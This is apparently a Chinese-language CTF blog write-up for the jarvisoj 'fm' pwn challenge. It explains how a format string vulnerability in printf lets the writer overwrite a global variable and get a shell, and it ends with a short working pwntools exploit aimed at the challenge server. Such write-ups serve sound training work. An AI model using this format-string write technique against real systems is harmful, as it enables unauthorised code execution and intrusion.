---
layout:     post
title:      jarvisoj [61dctf]fm
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Download:
https://dn.jarvisoj.com/challengefiles/fm.eaef2247796c11db798a579396482399

Address:
nc pwn2.jarvisoj.com 9895
```
<!-- more -->


### 0x01 IDA分析

将可执行文件放到IDA分析, 定位到 main 函数, 这里的 read 方法可能存在栈溢出

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x00.png)

看看栈布局, 不能覆盖返回地址, 而且开了 NX 和 Canary, 此处似乎不能利用

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x01.png)

再看看程序逻辑, 只需判断 x 是否等于 4, 判断成功即可 getshell, 但 x 默认等于 3

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x02.png)

而 main 函数的 printf 方法存在格式化字符串漏洞, 利用此处漏洞可以实现任意读写

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x03.png)

由于开了 Canary, 先来 debug 确定是否会影响到我们在栈上布局 payload

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x04.png)

定位到 printf((const char *)&v5), 打印栈区数据

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x05.png)

这里 0x41414141 便是我们数据的数据 'AAAA', 输入的字符串相对于栈上的偏移位置是 11

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x06.png)
![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x07.png)

经过两次 debug 可以确定放置 Canary 特征值的位置相对栈上的偏移位置是 31, 足够布置 payload

最后只需将 x 处数据覆写成 4 即可 getshell


### 0x02 exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote('pwn2.jarvisoj.com', 9895)
#Io = process('./fm')
bin = ELF('./fm')

payload = p32(0x0804A02C) + '%11$n'
Io.send(payload)
Io.interactive()
```

getshell

![](/assets/img/ctf/pwn/2017-08-06-jarvisoj-fm/0x08.png)